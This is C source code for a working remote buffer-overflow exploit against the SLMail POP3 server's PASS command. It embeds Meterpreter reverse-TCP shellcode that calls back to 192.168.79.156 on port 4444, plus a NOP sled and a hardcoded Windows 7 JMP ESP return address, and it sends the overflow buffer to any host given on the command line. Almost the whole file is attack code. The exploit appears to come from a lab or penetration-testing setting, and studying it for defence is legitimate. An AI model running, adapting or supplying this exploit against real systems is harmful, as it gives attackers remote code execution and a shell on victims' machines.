/*
SLMAIL REMOTE PASSWD BOF bob1bob2
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// meterpreter windows tcp shellcode lhost= 192.168.79.156, lport=4444
unsigned char shellcode[] = 
"\xdb\xd1\xba\x05\x26\x7d\xc4\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x54\x83\xc6\x04\x31\x56\x14\x03\x56\x11\xc4\x88\x38\xf1\x8a"
"\x73\xc1\x01\xeb\xfa\x24\x30\x2b\x98\x2d\x62\x9b\xea\x60\x8e"
"\x50\xbe\x90\x05\x14\x17\x96\xae\x93\x41\x99\x2f\x8f\xb2\xb8"
"\xb3\xd2\xe6\x1a\x8a\x1c\xfb\x5b\xcb\x41\xf6\x0e\x84\x0e\xa5"
"\xbe\xa1\x5b\x76\x34\xf9\x4a\xfe\xa9\x49\x6c\x2f\x7c\xc2\x37"
"\xef\x7e\x07\x4c\xa6\x98\x44\x69\x70\x12\xbe\x05\x83\xf2\x8f"
"\xe6\x28\x3b\x20\x15\x30\x7b\x86\xc6\x47\x75\xf5\x7b\x50\x42"
"\x84\xa7\xd5\x51\x2e\x23\x4d\xbe\xcf\xe0\x08\x35\xc3\x4d\x5e"
"\x11\xc7\x50\xb3\x29\xf3\xd9\x32\xfe\x72\x99\x10\xda\xdf\x79"
"\x38\x7b\x85\x2c\x45\x9b\x66\x90\xe3\xd7\x8a\xc5\x99\xb5\xc2"
"\x2a\x90\x45\x12\x25\xa3\x36\x20\xea\x1f\xd1\x08\x63\x86\x26"
"\x6f\x5e\x7e\xb8\x8e\x61\x7f\x90\x54\x35\x2f\x8a\x7d\x36\xa4"
"\x4a\x82\xe3\x51\x4e\x14\xcc\x0e\x1f\x78\xa4\x4c\xa0\x91\x69"
"\xd8\x46\xc1\xc1\x8a\xd6\xa1\xb1\x6a\x87\x49\xd8\x64\xf8\x69"
"\xe3\xae\x91\x03\x0c\x07\xc9\xbb\xb5\x02\x81\x5a\x39\x99\xef"
"\x5c\xb1\x28\x0f\x12\x32\x58\x03\x42\x23\xa2\xdb\x92\xce\xa2"
"\xb1\x96\x58\xf4\x2d\x94\xbd\x32\xf2\x67\xe8\x40\xf5\x97\x6d"
"\x71\x8d\xa1\xfb\x3d\xf9\xcd\xeb\xbd\xf9\x9b\x61\xbe\x91\x7b"
"\xd2\xed\x84\x84\xcf\x81\x14\x10\xf0\xf3\xc9\xb3\x98\xf9\x34"
"\xf3\x06\x01\x13\x80\x41\xfd\xe1\xa4\xe9\x96\x19\xe8\x09\x67"
"\x70\xe8\x59\x0f\x8f\xc7\x56\xff\x70\xc2\x3e\x97\xfb\x82\x8d"
"\x06\xfb\x8f\x50\x97\xfc\x23\x49\xce\x72\xc4\x6e\xef\x74\xf9"
"\xb8\xd6\x02\x3a\x79\x6d\x1c\x71\xdc\xc4\xb7\x79\x72\x16\x92";


void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 360);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP win7 0x5f4a358f

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
